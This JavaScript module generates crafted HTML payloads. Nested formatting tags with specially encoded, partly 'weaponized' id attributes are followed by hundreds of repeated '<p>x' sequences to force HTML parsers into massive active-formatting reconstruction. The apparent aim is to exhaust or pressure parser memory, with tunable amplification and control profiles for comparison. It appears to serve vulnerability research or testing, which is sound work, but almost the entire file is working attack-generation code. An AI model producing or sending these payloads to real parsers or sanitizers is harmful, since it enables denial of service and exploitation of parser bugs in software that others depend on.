import { createHash } from 'node:crypto';

export const COMPACT_ID_ALPHABET =
  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%()*+,-./:;?@[]^_{|}~';
export const AGGRESSIVE_ID_ALPHABET = Array.from({ length: 128 }, (_, value) => value)
  .filter((value) => ![9, 10, 12, 13, 32, 34, 38, 39, 62].includes(value))
  .map((value) => String.fromCharCode(value))
  .join('');
const WEAPONIZED_SINGLE_IDS = `${AGGRESSIVE_ID_ALPHABET}&`;
const WEAPONIZED_SUFFIXES = ['"', '&', '<'];
const CAPACITY_CONSERVATIVE_IDS = Array.from({ length: 94 }, (_, value) => value + 33)
  .filter((value) => ![34, 38, 39, 60, 61, 62, 96].includes(value))
  .map((value) => String.fromCharCode(value));
const CAPACITY_FUSED_IDS = [
  '&',
  '<',
  ...CAPACITY_CONSERVATIVE_IDS.filter((value) => value !== '&' && value !== '<'),
];

function encodeWithAlphabet(value, alphabet) {
  const radix = alphabet.length;
  let encoded = '';
  do {
    encoded = alphabet[value % radix] + encoded;
    value = Math.floor(value / radix);
  } while (value > 0);
  return encoded;
}

function encodeCompactId(value) {
  return encodeWithAlphabet(value, COMPACT_ID_ALPHABET);
}

function encodeWeaponizedId(value) {
  if (value < WEAPONIZED_SINGLE_IDS.length) return WEAPONIZED_SINGLE_IDS[value];
  value -= WEAPONIZED_SINGLE_IDS.length;
  const group = Math.floor(value / AGGRESSIVE_ID_ALPHABET.length);
  if (group >= WEAPONIZED_SUFFIXES.length) {
    throw new Error(`weaponized encoding exhausted at id value=${value}`);
  }
  return AGGRESSIVE_ID_ALPHABET[value % AGGRESSIVE_ID_ALPHABET.length] +
    WEAPONIZED_SUFFIXES[group];
}

export function encodeId(value, encoding = 'base36') {
  if (!Number.isInteger(value) || value < 0) {
    throw new Error(`invalid id value=${value}`);
  }
  if (encoding === 'base36') return value.toString(36);
  if (encoding === 'compact') return encodeCompactId(value);
  if (encoding === 'wide') return value === 0 ? '\u0100' : encodeCompactId(value - 1);
  if (encoding === 'quote') return value === 0 ? 'a"' : encodeCompactId(value - 1);
  if (encoding === 'aggressive') return encodeWithAlphabet(value, AGGRESSIVE_ID_ALPHABET);
  if (encoding === 'weaponized') return encodeWeaponizedId(value);
  throw new Error(`invalid encoding=${encoding}`);
}

export function makePayload(
  formattingCount,
  profile,
  reconstructionCount = formattingCount,
  encoding = 'base36',
  prefixText = false,
) {
  if (!Number.isInteger(formattingCount) || formattingCount < 1 || formattingCount > 5000) {
    throw new Error(`invalid formattingCount=${formattingCount}`);
  }
  if (!Number.isInteger(reconstructionCount) || reconstructionCount < 1 || reconstructionCount > 5000) {
    throw new Error(`invalid reconstructionCount=${reconstructionCount}`);
  }
  if (formattingCount * reconstructionCount > 4_000_000) {
    throw new Error('payload geometry exceeds 4,000,000 reconstructed elements');
  }
  if (profile !== 'candidate' && profile !== 'control') {
    throw new Error(`invalid profile=${profile}`);
  }
  const attribute = profile === 'candidate' ? 'id' : 'xx';
  let value = prefixText ? 'x<p>' : '<p>';
  for (let i = 0; i < formattingCount; i++) {
    value += `<b ${attribute}=${encodeId(i, encoding)}>`;
  }
  value += '<p>x'.repeat(reconstructionCount);
  return value;
}

export function makeCapacityPayload(
  profile,
  variant = 'conservative',
  reconstructionCount = 496,
  amplificationCount = 0,
  tailAmplificationCount = 0,
) {
  if (profile !== 'candidate' && profile !== 'control') {
    throw new Error(`invalid profile=${profile}`);
  }
  if (!['conservative', 'fused', 'hybrid'].includes(variant)) {
    throw new Error(`invalid capacity variant=${variant}`);
  }
  if (!Number.isInteger(reconstructionCount) || reconstructionCount < 1 || reconstructionCount > 5000) {
    throw new Error(`invalid reconstructionCount=${reconstructionCount}`);
  }
  if (!Number.isInteger(amplificationCount) || amplificationCount < 0 || amplificationCount > 25) {
    throw new Error(`invalid amplificationCount=${amplificationCount}`);
  }
  if (!Number.isInteger(tailAmplificationCount) || tailAmplificationCount < 0 || tailAmplificationCount > 8) {
    throw new Error(`invalid tailAmplificationCount=${tailAmplificationCount}`);
  }

  const attribute = profile === 'candidate' ? 'id' : 'xx';
  let ids;
  if (variant === 'conservative') {
    ids = CAPACITY_CONSERVATIVE_IDS.slice(0, 27);
  } else if (variant === 'fused') {
    ids = CAPACITY_FUSED_IDS.slice(0, 27);
  } else {
    const source = CAPACITY_CONSERVATIVE_IDS.slice(0, 25);
    const amplifiedIndexes = new Set(
      Array.from({ length: amplificationCount }, (_, value) => value),
    );
    // Fine-grained pressure control: amplify one-entry groups first, then
    // three-entry groups. This fills the 11-byte gap between large groups.
    const tailOrder = [21, 22, 23, 24, 17, 18, 19, 20];
    for (const index of tailOrder.slice(0, tailAmplificationCount)) {
      amplifiedIndexes.add(index);
    }
    ids = [
      '&',
      '<',
      ...source.map((value, index) => amplifiedIndexes.has(index) ? `${value}"` : value),
    ];
  }
  const parts = ['<p>'];
  const add = (tag, idValue, count = 1) => {
    const attr = idValue === null ? attribute : `${attribute}=${idValue}`;
    parts.push(`<${tag} ${attr}>`.repeat(count));
  };

  // One empty-ID group with 22 distinct active-formatting entries.
  for (const tag of ['b', 'i', 's', 'u']) add(tag, null, 3);
  for (const tag of ['em', 'tt']) add(tag, null, 3);
  add('big', null, 3);
  add('a', null);

  let cursor = 0;
  // 19 groups of 11 entries; after 496 reconstructions each has 5,467 nodes.
  for (const id of ids.slice(cursor, cursor + 19)) {
    add('b', id, 3);
    add('i', id, 3);
    add('s', id, 3);
    add('u', id, 2);
  }
  cursor += 19;

  // Four groups of three entries; each reaches 1,491 nodes.
  for (const id of ids.slice(cursor, cursor + 4)) add('b', id, 3);
  cursor += 4;

  // Four groups of one entry; each reaches 497 nodes.
  for (const id of ids.slice(cursor, cursor + 4)) add('b', id);

  parts.push('<p>x'.repeat(reconstructionCount));
  return parts.join('');
}

export function capacityPayloadMeta(
  profile,
  variant = 'conservative',
  reconstructionCount = 496,
  amplificationCount = 0,
  tailAmplificationCount = 0,
) {
  const value = makeCapacityPayload(
    profile,
    variant,
    reconstructionCount,
    amplificationCount,
    tailAmplificationCount,
  );
  return {
    shape: 'capacity',
    variant,
    reconstructionCount,
    amplificationCount,
    tailAmplificationCount,
    profile,
    value,
    bytes: Buffer.byteLength(value, 'utf8'),
    sha256: createHash('sha256').update(value).digest('hex'),
  };
}

export function payloadMeta(
  formattingCount,
  profile,
  reconstructionCount = formattingCount,
  encoding = 'base36',
  prefixText = false,
) {
  const value = makePayload(formattingCount, profile, reconstructionCount, encoding, prefixText);
  return {
    formattingCount,
    reconstructionCount,
    encoding,
    prefixText,
    profile,
    value,
    bytes: Buffer.byteLength(value, 'utf8'),
    sha256: createHash('sha256').update(value).digest('hex'),
  };
}
